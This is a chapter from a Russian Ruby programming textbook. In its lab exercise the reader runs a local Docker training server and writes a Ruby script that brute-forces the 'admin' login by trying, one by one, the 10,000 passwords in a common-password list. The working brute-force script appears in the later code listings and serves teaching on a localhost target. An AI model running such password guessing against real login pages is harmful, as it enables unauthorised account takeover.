## Практическое занятие: подбор пароля и спасение мира

Мы познакомились с отладчиком, а значит, теперь сможем не только создавать программы, но и более уверенно работать с кодом. Отладчик позволяет приостановить выполнение программы и заглянуть внутрь, а это значит, что мы сможем наблюдать за поведением программы, когда это поведение от нас не зависит.

Представьте, что вы создаете программу, которая скачивает какие-то данные из Сети. Все написано верно, но ответ от сервера — это всегда неопределенность. Иногда может случиться так, что сервер выдает ошибку. Иногда нет соединения с Интернетом. Иногда приходит ответ в совершенно неожиданном формате. В таких случаях можно установить брейкпоинт и посмотреть на сам ответ.

В этой главе мы сделаем практическое упражнение. Машины захватили мир, вас зовут Джон, и вы должны спасти планету. Для того чтобы это сделать, нужно пройти на центральный сервер и ввести пароль. Однако вам известно только имя пользователя — «admin». Пароль предстоит подобрать.

Для выполнения этого упражнения нам потребуется установить `Docker` (далее «Докер», также известный как «Docker for developers» или «Docker community edition (CE)»). Скачать Докер для Windows или macOS можно на [официальном сайте](https://www.docker.com/get-started).

Для Linux возможна установка тремя совершенно разными способами: 

> 1) через добавление репозитория;
> 2) через скачивание deb-файла;
> 3) через вспомогательный скрипт.

Все способы установки описаны на [сайте](https://docs.docker.com/install/linux/docker-ce/ubuntu/), но самая простая установка Докера на Linux — через скрипт:

{line-numbers: false}
```shell
$ curl -fsSL https://get.docker.com -o get-docker.sh
$ sudo sh get-docker.sh
```
 
После этого, возможно, потребуется перезагрузить компьютер и терминал. Проверьте, что Докер установлен и работает:

{line-numbers: false}
```shell
$ docker -v
Docker version 17.06.2-ce, build cec0b72
```

После того как Докер установлен, можно приступать к «поднятию» тренировочного хоста. Если вкратце, то Докер — это система виртуализации. Она позволяет запустить на вашем компьютере мини-операционные системы. Эти мини-ОС созданы на базе Linux. Другими словами, на вашем компьютере может быть запущена сотня мини-линуксов. Но откуда возникла эта необходимость?

Дело в том, что программисты работают с большим количеством дополнительного (`third party`) софта. Например, базы данных, веб-серверы, системы кеширования. Программные системы становятся все сложнее, и для локальной разработки порой нужно установить несколько совершенно разных баз данных. Но вот незадача, бывает так, что две базы данных требуют совершенно разной, несовместимой конфигурации. Можно настроить свой компьютер двумя разными способами, но эти способы несовместимы друг с другом (например, требуется разная версия Linux). Что же делать?

На помощь пришел Докер. Он позволяет изолировать выполнение программ внутри своей мини-ОС. И позволяет запустить несколько таких мини-ОС одновременно, потому что они изолированы друг от друга. С помощью нехитрых параметров можно сделать так, чтобы программист видел только порты этих мини-ОС (например, порт 1234 и 5555) и не беспокоился о том, что там внутри.

Образ такой мини-ОС создали для вас авторы этой книги. Вы можете скачать его и запустить на своем компьютере с помощью следующей команды оболочки:

{line-numbers: false}
```shell
$ docker rm xxx; docker run -it --name xxx -p 4567:4567 ro31337/rubybook-save-the-world
```

Команда выше состоит из двух команд:

* `docker rm xxx` — удаляет контейнер с именем «xxx» (если он существует. Если нет, то появится ошибка «Error: No such container: xxx» — это нормально, просто проигнорируйте ее);
* `docker run -it --name xxx -p 4567:4567 ro31337/rubybook-save-the-world` (запускает контейнер и «пробрасывает» порт 4567 на локальный хост).

(Так как общая команда оболочки разделена с помощью точки с запятой, а не с помощью `&&`, то при отсутствии контейнера `xxx` выполнение не прервется.)

Вывод команды (чтобы завершить выполнение контейнера, нажмите `Ctrl+C`, но после того, как пройдете по адресу ниже в браузере):

{line-numbers: false}
```
Unable to find image 'ro31337/rubybook-save-the-world:latest' locally
latest: Pulling from ro31337/rubybook-save-the-world
...
Digest: sha256:bb0eb57fb52db2be2214d978cb304101b3cb883ccc454c1ad97faee84b088b0d
Status: Downloaded newer image for ro31337/rubybook-save-the-world:latest
[2018-08-15 02:25:13] INFO  WEBrick 1.4.2
[2018-08-15 02:25:13] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux]
== Sinatra (v2.0.3) has taken the stage on 4567 for development with backup from WEBrick
[2018-08-15 02:25:13] INFO  WEBrick::HTTPServer#start: pid=1 port=4567
```

Попробуйте пройти по адресу [http://localhost:4567/](http://localhost:4567/), вы должны увидеть наш экспериментальный веб-сайт:

{width=100%}
![Сайт, к которому попробуем подобрать пароль](images/087-protected-area.png)

Все, что мы можем сделать, — ввести неправильный логин и пароль (попробуйте это сделать). Мы знаем только логин («admin»), но каким образом можно узнать пароль и спасти планету от машин?

Во-первых, нам потребуется файл с паролями. Он уже находится на нашем хосте по адресу [http://localhost:4567/passwords.txt](http://localhost:4567/passwords.txt) — в нем представлены 10 тысяч самых популярных паролей. Вы можете скачать этот файл к себе в директорию с помощью команды `wget` (или просто сохраните этот файл из своего браузера):

{line-numbers: false}
```
$ wget http://localhost:4567/passwords.txt
```

Точно известно, что один из паролей в этом списке является правильным. Давайте подумаем еще: как мы можем использовать язык Руби и наши знания, для того чтобы продвинуться дальше?

Первым правильным шагом была бы итерация по этому списку. Все равно пароль должен быть сохранен в какой-нибудь переменной в нашей программе. Поэтому вначале неплохо было бы разобраться, как именно мы можем выполнить итерацию по каждой строке из файла `passwords.txt`.

Существует несколько методов прохода по каждой строке какого-либо текстового файла:  

* прочитать содержимое файла в память как большую строку, разбить на строки с помощью `.split("\n")`;
* получить содержимое строк какого-либо файла сразу в виде массива и сделать обход массива;
* воспользоваться методом, который специально предназначен для чтения строк из файлов.

Все методы имеют право на реализацию. Но мы воспользуемся последним вариантом, т.к. «под капотом» этот метод не читает файлы в память целиком, а читает только строки: одну за другой. Представьте, что у вас есть огромный файл на сотни гигабайт и вы хотите сделать проход по каждой строке. Наверное, не имеет смысла читать его целиком в память, когда можно обойтись без этого и читать по одной строке?

Постойте, скажет внимательный читатель, так ведь в любом случае мы файл прочитаем целиком. Так какая разница — прочитать его сразу или постепенно? Дело в том, что при чтении по одной строке Руби будет «избавляться» от предыдущих строк. Это будет происходить автоматически с помощью механизма «сборки мусора» (`garbage collection`, или `GC`).

Руби достаточно умен, и когда какое-то значение уже не нужно, участок памяти будет помечен к удалению. Позднее, когда будет достигнут какой-то предел (он зависит от разных настроек), все эти помеченные участки будут освобождены. А это значит, что на это место можно будет записать новые данные. Таким образом, мы читаем файл целиком, но читаем его частями. И файл целиком в памяти никогда не хранится. Впрочем, для нашей задачи это несущественные технические детали.

Давайте посмотрим на метод `each_line` из класса `IO` (`IO` расшифровывается как «input output» — «ввод-вывод», этот класс отвечает за операции ввода-вывода, т.е. за работу с диском). Небольшая документация по этому методу доступна по [ссылке](http://ruby-doc.org/core-2.5.1/IO.html#method-i-each_line).

X> ## Задание 1
X> Не подсматривая решение, данное ниже, попробуйте обратиться к документации и написать программу, которая считывает из файла все строки и выводит на экран длину каждой строки. Проверьте свой результат.

Ниже представлен код программы, которая считывает каждую строку в файле `passwords.txt` и выводит ее длину:

{line-numbers: false}
```ruby
File.new('passwords.txt').each do |line|
  password = line.chomp
  puts password.size
end
```

Запустим программу:

{line-numbers: false}
```
$ ruby save_the_world.rb
```

Результат работы программы:

{line-numbers: false}
```
…
6
5
8
6
6
```

Ура! Мы получили что-то на экране. Однако настоящий программист никогда себе не верит. Надо каким-то образом проверить, что программа работает. Давайте воспользуемся особенностью оболочки, которая называется `pipe` («труба»). С помощью `pipe` (`|`) мы перенаправим вывод куда-нибудь еще. Например, в shell-команду `wc -l`. Справка по `wc` (запустите `man wc`) сообщает нам о флаге `-l`:

> The number of lines...

Другими словами, в каждой операционной системе (помимо Windows) существует команда «wc», которая расшифровывается как «word count». Если запустить ее с параметром `-l`, то она посчитает строки (`lines`). Мы подаем на стандартный ввод этой команды результат работы нашей программы. И считаем количество строк. Должно быть 10 000: по одной строке (в виде цифр, но это не важно) на каждую строку из файла «passwords.txt»:

{line-numbers: false}
```shell
$ ruby save_the_world.rb | wc -l
   10000
```

Отлично, результат совпадает и идентичен результату подсчета строк в самом файле `passwords.txt`:

{line-numbers: false}
```shell
$ cat passwords.txt | wc -l
   10000
```

Так как после запуска `ruby save_the_world.rb` в терминале нам видны длины последних строк, попробуем вывести на экран пять последних строк из файла `passwords.txt` с помощью команды `tail`:

{line-numbers: false}
```shell
$ tail -5 passwords.txt
eighty
epson
evangeli
eeeee1
eyphed
``` 

И попробуем сравнить длины этих пяти слов с тем, что выводит наша программа в самом конце:

{line-numbers: false}
```
6
5
8
6
6
```

Создавая любую программу, необходимо двигаться постепенно и проверять себя на каждом шаге. Ошибка, которую начинающий программист мог допустить в этом примере, — забытый оператор `chomp`. В итоге вывод выглядел бы как `8, 7, 10, 8, 8`, а это на два символа больше в каждом слове. Файл `passwords.txt` содержит нестандартное (для ОС семейства Linux) окончание строки: CRLF ("\r\n") вместо LF ("\n").

Следующий шаг в нашем задании — непосредственно отправка данных на сервер. Давайте посмотрим на то, как это происходит, когда пользователь вводит какие-либо данные. Для этого нам понадобится браузер Chrome. Откройте нашу тестовую страницу [http://localhost:4567](http://localhost:4567). 

Нажмите правой кнопкой (или двумя пальцами одновременно на macOS) на любой свободной области и выберите опцию `Inspect` из выпадающего меню:

{width=20%}
![Контекстное меню в Google Chrome. При выборе «Inspect» вызывается Chrome Developer Tools](images/087-inspect.png)

Внизу появится панель, которая называется `Chrome Developer Tools`:

{width=100%}
![Chrome Developer Tools](images/087-chrome-dev-tools.png)

Это мощный инструмент, который содержит в себе навигатор по элементам HTML (вкладка «Elements» — активна на рисунке выше), JavaScript-консоль (REPL, вкладка «Console»), отладчик (вкладка «Sources»), анализатор сетевых пакетов (вкладка «Network») и многое другое.

В зависимости от предпочтений и размера экрана вашего компьютера инструмент можно расположить в разных частях страницы или в виде отдельного окна:

{width=50%}
![Chrome Developer Tools dock options](images/087-dock-it.png)

На данном этапе нас будет интересовать вкладка «Network» — анализатор сетевых пакетов. Откройте эту вкладку, заполните поля логин и пароль на самой странице (не важно, что вы введете, можно ввести «admin» и «123456») и нажмите на кнопку «Login», после этого вы увидите сообщение об ошибке на странице (ожидаемо, ведь пароль нам неизвестен) и строку с кодом 200 чуть ниже:

{width=100%}
![Вкладка Network в Chrome Developer Tools](images/087-network-tab.png)

При нажатии на эту строку можно увидеть основные параметры запроса:

{width=60%}
![Параметры запроса](images/087-query-params.png)

Нас интересуют четыре параметра:

* Request URL (иногда говорят «endpoint»): `http://localhost:4567/login`;
* Request Method (или просто «method»): `POST`;
* `username`;
* `password`.

К сожалению, Chrome Developer Tools не позволяют увидеть оригинальный запрос в текстовом виде. Однако такие инструменты, как Fiddler (преимущественно для Windows, существуют бета-версии для macOS и Linux) или Charles Proxy (платный, для macOS), позволяют увидеть запрос в «сыром» виде:

{width=100%}
![Charles Proxy показывает необработанный HTTP-запрос](images/087-charles-proxy.png)

Другими словами, если мы подключимся с помощью какой-нибудь простой программы (например, telnet) и отправим текст, который виден на рисунке, то мы получим точно такой же ответ от сервера, который получает браузер.

X> ## Задание 2
X> Современные инструменты позволяют представить ответ от сервера в виде таблиц и структурированных данных, хотя на самом деле протокол HTTP — это всего лишь текст, разбитый на несколько строк. Это касается как запросов (`request`), так и ответов (`response`, `reply`). Попробуйте зайти на свой любимый сайт с помощью пароля и посмотреть на этот запрос в Chrome Developer Tools. Сравните этот запрос с «сырыми» данными, которые вы можете получить при помощи других инструментов.

Примечание: во время работы с некоторыми прокси-инструментами авторы заметили нестабильность в работе `docker`. Если соединения с `localhost` не будет, возможно, придется перезагрузить компьютер или перезапустить `docker`-контейнер.

X> ## Задание 3
X> Попробуйте подключиться к локальному серверу с помощью `telnet` и отправить GET-запрос вручную: `telnet localhost 4567`. После того как подключение установится, введите `GET / HTTP/1.0` и два раза нажмите `Enter`.
>
X> ## Задание 4
X> Попробуйте подключиться к локальному серверу с помощью `telnet` и отправить POST-запрос вручную: `telnet localhost 4567`. После того как подключение установится, наберите с клавиатуры текст ниже (без копирования) и нажмите `Enter`:

{line-numbers: false}
```
POST /login HTTP/1.0
Content-length: 30

username=admin&password=123456
```

После того как мы разобрались с тем, что GET- и POST-запросы и ответы — это всего лишь текст, осталось научить Руби делать то же самое. К счастью, для этих целей в Руби существует специальная [библиотека «net/http»](https://ruby-doc.org/stdlib-2.5.1/libdoc/net/http/rdoc/Net/HTTP.html). Давайте напишем минимальную программу, которая отправляет POST-запрос с именем пользователя «admin» и паролем «123456».

X> ## Задание 5
X> Попробуйте написать эту программу самостоятельно, изучив документацию, и сравните результат с написанным ниже. Программа должна выводить на экран ответ от сервера, который содержит строку «Wrong username or password, please try again».

Код рабочей программы — всего 5 строк (одна из которых пустая):

```ruby
require 'net/http'

uri = URI('http://localhost:4567/login')
res = Net::HTTP.post_form(uri, username: 'admin', password: '123456')
puts res.body
``` 

По большей части этот код скопирован из документации. Первая строка подключает библиотеку. Третья строка создает объект `uri`, т.н. Universal Resource Identifier. Он называется так потому, что содержит в себе 4 составляющие: протокол (`http`), имя хоста (`localhost`), порт (4567), путь (`/login`). Четвертая строка — это всего лишь вызов метода `post_form` из библиотеки «net/http», в который мы передаем uri и хеш с параметрами. Эту строку можно было бы записать иначе, явно указав хеш:

{line-numbers: false}
```ruby
res = Net::HTTP.post_form(uri, { username: 'admin', password: '123456' })
```

Но в этом случае инструмент статического анализа кода `Rubocop` выдал бы предупреждение: «Redundant Curly Braces» («фигурные скобки без необходимости»).

Последняя, пятая строка выводит на экран содержимое ответа:

{line-numbers: false}
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="tacit-css.min.css"/>
  </head>

  <body >
    <div>
      <p>Wrong username or password, please try again</p>

    </div>
  </body>
</html>
```

Давайте попробуем совместить две программы: программу для итерации по строкам из файла и программу для создания http-запросов:

{line-numbers: false}
```ruby
require 'net/http'

uri = URI('http://localhost:4567/login')

File.new('passwords.txt').each do |line|
  password = line.chomp
  puts "Trying #{password}..."
  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
  puts res.body
end
```

Программа работает, пробует каждый пароль из файла и выводит на экран результат. Так как пароль точно в этом списке, то однажды эта программа выведет какой-то другой результат. И все, что нам остается, — наблюдать. Но есть два момента, которые могут быть улучшены.

Для наблюдений в «ручном» режиме и в реальном времени скорость программы слишком высока (около 10 паролей в секунду). Человек не сможет распознать какой-то другой вывод (какой именно это будет вывод — мы не знаем). Этого можно избежать, если добавить задержку. Нет различия между правильным и неправильным вариантами. Если пароль правильный — программа продолжает перебирать остальные.

Эти два недочета легко исправить с помощью условия: если в теле ответа `res.body` содержится слово «Wrong», то нужно продолжать. Иначе — выходить из программы. Давайте внесем это изменение и посмотрим на результат:

{line-numbers: false}
```ruby
require 'net/http'

uri = URI('http://localhost:4567/login')

File.new('passwords.txt').each do |line|
  password = line.chomp
  puts "Trying #{password}..."
  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
  if res.body.include?('Wrong')
    # не делать ничего, просто продолжать
  else
    puts "Password found: #{password}"
    exit
  end
end
```

Результат работы программы:

{line-numbers: false}
```
Trying password...
Trying 123456...
Trying 12345678...
Trying 1234...
Trying qwerty...
Trying 12345...
...
Password found: (чтобы вам было интереснее, мы не стали его приводить в книге)
```

Ура, мы нашли пароль и спасли планету! Попробуем ввести логин «admin» и пароль в веб-интерфейсе, и мы получим следующий результат на экране:

{width=100%}
![Вы спасли планету!](images/087-welcome-admin.png)

X> ## Задание 6
X> Попробуйте запустить программу и спасти планету. Подумайте, как можно улучшить конструкцию `if`, чтобы она была более наглядной и лаконичной.
>
X> ## Задание 7
X> Когда правильный пароль найден, введите текст ниже в свой текстовый редактор и замените «123456» на найденный пароль:

{line-numbers: false}
```
POST /login HTTP/1.0
Content-length: 30

username=admin&password=123456
```

Скопируйте текст в буфер обмена, попробуйте подключиться к локальному серверу с помощью `telnet localhost 4567`, отправьте скопированный POST-запрос вручную и нажмите `Enter`. Убедитесь, что ответ от сервера содержит слово «Congratulations».
